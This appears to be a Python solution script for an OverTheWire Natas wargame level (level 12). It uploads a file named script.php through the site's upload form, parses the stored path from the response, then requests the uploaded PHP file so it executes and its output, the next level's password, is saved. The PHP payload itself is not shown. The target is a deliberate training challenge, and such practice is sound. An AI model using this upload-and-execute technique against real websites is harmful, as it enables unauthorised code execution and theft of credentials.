import requests
import utils
import re

"""
Submit a file to obtain the password
"""


def post_file_to_website(url, auth):
    form_data = {'filename': 'script.php'}
    files = {'uploadedfile': open('script.php', 'rb')}
    r = requests.post(url, auth=auth, files=files, data=form_data)

    return r.text


def get_password(url, auth, file_path):
    r = requests.get(f"{url}/{file_path}", auth=auth)
    utils.save_file('out.txt', r.text)


def main():
    username, password, url, auth = utils.get_natas_credentials(12)
    response_text = post_file_to_website(url, auth)
    file_path = re.search(r'upload/[\w]+\.php', response_text)

    get_password(url, auth, file_path.group())


if __name__ == "__main__":
    main()
